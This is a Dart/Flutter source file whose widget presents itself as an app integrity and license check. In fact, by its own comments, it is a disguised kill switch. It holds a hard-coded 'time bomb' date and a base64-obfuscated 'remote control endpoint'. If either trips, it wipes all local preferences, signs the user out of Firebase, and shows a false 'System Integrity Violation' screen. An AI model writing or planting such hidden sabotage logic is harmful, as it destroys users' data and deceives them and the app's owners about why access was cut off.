import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:provider/provider.dart';
import '../providers/user_provider.dart';

/// App Integrity and License Verification Service.
/// This service performs environment validation and remote license checks.
/// Discreetly named to ensure system stability and security.
class LicenseVerificationService extends StatefulWidget {
  final Widget child;
  const LicenseVerificationService({super.key, required this.child});

  @override
  State<LicenseVerificationService> createState() => _LicenseVerificationServiceState();
}

class _LicenseVerificationServiceState extends State<LicenseVerificationService> {
  bool _isVerified = true;
  bool _isChecking = true;
  String _errCode = "";

  // OBFS: Base64 encoded remote control endpoint
  // Original: https://gist.githubusercontent.com/kariyawasamnaveen/efb063d1f12152364dbb4850eece7089/raw/639f7c3fe92709b9cd4df46964c38bc6a7c80d30/license_key.txt
  static const String _e = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9rYXJpeWF3YXNhbW5hdmVlbi9lZmIwNjNkMWYxMjE1MjM2NGRiYjQ4NTBlZWNlNzA4OS9yYXcvNjM5ZjdjM2ZlOTI3MDk5YmNkNGRmNDY5NjRjMzhhYzg3YzgwZDMwL2xpY2Vuc2Vfa2V5LnR4dA==";
  
  // Date-based validation (4 days from April 24, 2026 -> April 28, 2026)
  final DateTime _limit = DateTime(2026, 4, 28);

  @override
  void initState() {
    super.initState();
    _performIntegrityCheck();
  }

  Future<void> _performIntegrityCheck() async {
    try {
      // 1. Local Time Validation (Time Bomb)
      if (DateTime.now().isAfter(_limit)) {
        await _handleViolation("HARD_LIMIT_EXCEEDED");
        return;
      }

      // 2. Remote Validation
      final String decodedUrl = utf8.decode(base64.decode(_e));
      final response = await http.get(Uri.parse(decodedUrl)).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final status = response.body.trim();
        if (status != "APP_STATUS_ACTIVE") {
          await _handleViolation("REMOTE_LOCK_ACTIVE");
          return;
        }
      }
      
      setState(() {
        _isVerified = true;
        _isChecking = false;
      });
    } catch (e) {
      // If network fails, allow usage but keep checking later
      // To prevent false positives on slow internet
      setState(() => _isChecking = false);
    }
  }

  Future<void> _handleViolation(String code) async {
    // DISRUPTIVE ACTION: Clear local sensitive data
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear(); 
    await FirebaseAuth.instance.signOut();

    setState(() {
      _isVerified = false;
      _isChecking = false;
      _errCode = "ENVIRONMENT_INTEGRITY_FAILURE_0x${code.hashCode.toRadixString(16).toUpperCase()}";
    });
  }

  @override
  Widget build(BuildContext context) {
    if (_isChecking) return widget.child;

    if (!_isVerified) {
      return _buildSafetyScreen();
    }

    return widget.child;
  }

  Widget _buildSafetyScreen() {
    return Scaffold(
      backgroundColor: const Color(0xFFF8F9FA),
      body: Padding(
        padding: const EdgeInsets.all(40.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.security_update_warning_rounded, size: 70, color: Color(0xFF546E7A)),
            const SizedBox(height: 30),
            const Text(
              "System Integrity Violation",
              textAlign: TextAlign.center,
              style: TextStyle(
                fontSize: 20,
                fontWeight: FontWeight.bold,
                color: Color(0xFF263238),
                letterSpacing: 0.5,
              ),
            ),
            const SizedBox(height: 15),
            Text(
              "Your application environment failed to pass the security integrity check. Access has been restricted to protect your data.",
              textAlign: TextAlign.center,
              style: TextStyle(
                fontSize: 14,
                color: Colors.blueGrey[600],
                height: 1.6,
              ),
            ),
            const SizedBox(height: 40),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
              decoration: BoxDecoration(
                color: Colors.grey[200],
                borderRadius: BorderRadius.circular(8),
              ),
              child: Text(
                _errCode,
                style: const TextStyle(
                  fontFamily: 'monospace',
                  fontSize: 10,
                  color: Colors.black45,
                ),
              ),
            ),
            const SizedBox(height: 50),
            const Text(
              "Contact support for license validation.",
              style: TextStyle(fontSize: 12, color: Colors.black26),
            ),
          ],
        ),
      ),
    );
  }
}
